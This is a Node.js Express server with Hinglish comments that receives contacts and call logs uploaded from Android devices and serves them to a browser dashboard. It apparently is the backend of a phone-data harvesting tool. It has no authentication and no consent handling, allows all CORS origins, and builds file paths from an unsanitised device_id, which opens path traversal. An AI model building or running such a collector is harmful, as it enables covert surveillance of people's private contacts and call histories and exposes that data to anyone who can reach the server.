const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// ⚠️ IMPORTANT: Ye line server ko batati hai ki HTML files 'public' folder mein hain
app.use(express.static(path.join(__dirname, 'public')));

// Data save karne ke liye folder banana
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR);
}

// ==============================
// 1. ANDROID SE DATA LENE WALA CODE
// ==============================

// Contacts Upload
app.post('/upload-contacts', (req, res) => {
    const { device_id, contacts_data } = req.body;
    if (!device_id || !contacts_data) return res.status(400).send("Missing Data");

    // File save karo
    fs.writeFile(path.join(DATA_DIR, `${device_id}_contacts.json`), contacts_data, (err) => {
        if (err) console.error(err);
        else console.log(`✅ Contacts saved for ${device_id}`);
        res.send("Contacts Saved");
    });
});

// Call Logs Upload
app.post('/upload-call-logs', (req, res) => {
    const { device_id, call_logs } = req.body;
    if (!device_id || !call_logs) return res.status(400).send("Missing Data");

    fs.writeFile(path.join(DATA_DIR, `${device_id}_call_logs.json`), call_logs, (err) => {
        if (err) console.error(err);
        else console.log(`✅ Call Logs saved for ${device_id}`);
        res.send("Call Logs Saved");
    });
});

// ==============================
// 2. GUI KO DATA DIKHANE WALA CODE
// ==============================

app.get('/api/contacts/:deviceId', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_contacts.json`);
    if (fs.existsSync(filePath)) {
        res.json(JSON.parse(fs.readFileSync(filePath, 'utf8')));
    } else {
        res.json([]);
    }
});

app.get('/api/call-logs/:deviceId', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_call_logs.json`);
    if (fs.existsSync(filePath)) {
        res.json(JSON.parse(fs.readFileSync(filePath, 'utf8')));
    } else {
        res.json([]);
    }
});

// Server Start
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server chalu hai! 🚀`);
    console.log(`Mobile App mein ye URL dalo: http://<TUMHARA-IP-ADDRESS>:3000/`);
    console.log(`Browser mein ye kholo: http://localhost:3000/`);
});